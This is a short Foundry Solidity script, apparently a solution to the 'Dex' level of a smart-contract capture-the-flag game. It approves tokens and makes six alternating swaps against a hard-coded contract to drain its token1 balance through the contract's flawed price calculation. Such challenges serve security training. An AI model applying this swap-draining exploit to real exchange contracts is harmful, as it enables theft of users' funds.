// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel22.sol";

contract POC is Script {

    Dex level22 = Dex(0x84c765cfdbA36b9e81Db0eb7C9356eed77296ed6);
    function run() external{
        vm.startBroadcast();
        level22.approve(address(level22), 500);
        address token1 = level22.token1();
        address token2 = level22.token2();

        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);

        console.log("Final token1 balance of Dex is : ", level22.balanceOf(token1, address(level22)));
        vm.stopBroadcast();
    }
}